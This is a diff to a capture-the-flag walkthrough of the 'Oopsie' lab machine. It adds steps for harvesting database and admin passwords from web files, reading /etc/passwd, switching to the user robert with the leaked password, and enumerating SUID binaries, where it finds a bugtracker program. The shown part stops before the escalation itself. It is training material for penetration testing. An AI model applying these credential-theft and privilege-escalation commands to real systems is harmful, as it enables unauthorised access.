@@ -386,7 +386,7 @@ Since we are as user `www-data`, we cannot do much being this user. So we need t
 Within the `/var/www/html/cdn-cgi/login` directory we find two interesting files `db.php` and `admin.php.`&#x20;
 
 ```bash
-www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
+cat db.php
 ```
 
 ```
@@ -396,7 +396,7 @@ $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
 ```
 
 ```bash
-www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i passw*
+cat * | grep -i passw*
 ```
 
 ```
@@ -404,9 +404,176 @@ if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
 <input type="password" name="password" placeholder="Password" />
 ```
 
+```bash
+cat /etc/passwd
+```
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+robert:x:1000:1000:robert:/home/robert:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+### Lateral movement
+
+We gain shell access to robert user using:
+
+```
+www-data@oopsie$ su robert
+su robert
+Password: M3g4C0rpUs3r!
+
+robert@oopsie$
+```
+
+To get more info about robert's user account we can use the `id` command:
+
+```
+robert@oopsie:~$ id
+id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+```
+
+### Privilege Escalation
+
+We check if robert has `sudo` access using:
+
+```bash
+sudo -l
+```
+
+We get the following error which suggests that robert doesn't have `sudo` access.
+
+```
+[sudo] password for robert: M3g4C0rpUs3r!
+
+Sorry, user robert may not run sudo on oopsie.
+```
+
+We find every files with SUID set
 
 
 
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+```
+/snap/core/11420/bin/mount
+/snap/core/11420/bin/ping
+/snap/core/11420/bin/ping6
+/snap/core/11420/bin/su
+/snap/core/11420/bin/umount
+/snap/core/11420/usr/bin/chfn
+/snap/core/11420/usr/bin/chsh
+/snap/core/11420/usr/bin/gpasswd
+/snap/core/11420/usr/bin/newgrp
+/snap/core/11420/usr/bin/passwd
+/snap/core/11420/usr/bin/sudo
+/snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11420/usr/lib/openssh/ssh-keysign
+/snap/core/11420/usr/lib/snapd/snap-confine
+/snap/core/11420/usr/sbin/pppd
+/snap/core/11743/bin/mount
+/snap/core/11743/bin/ping
+/snap/core/11743/bin/ping6
+/snap/core/11743/bin/su
+/snap/core/11743/bin/umount
+/snap/core/11743/usr/bin/chfn
+/snap/core/11743/usr/bin/chsh
+/snap/core/11743/usr/bin/gpasswd
+/snap/core/11743/usr/bin/newgrp
+/snap/core/11743/usr/bin/passwd
+/snap/core/11743/usr/bin/sudo
+/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/11743/usr/lib/openssh/ssh-keysign
+/snap/core/11743/usr/lib/snapd/snap-confine
+/snap/core/11743/usr/sbin/pppd
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/ping
+/bin/su
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/bugtracker
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/sudo
+```
+
+We find we have a bugtracker executable in `/usr/bin`.&#x20;
+
+```bash
+robert@oopsie:~$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+```
+
+A successful execution of bugtracker executable is as shown below:&#x20;
+
+```
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+1
+---------------
+
+Binary package hint: ev-engine-lib
+
+Version: 3.3.3-1
+
+Reproduce:
+When loading library in firmware it seems to be crashed
+
+What you expected to happen:
+Synchronized browsing to be enabled since it is enabled for that site.
+
+What happened instead:
+Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+```
 
 
 
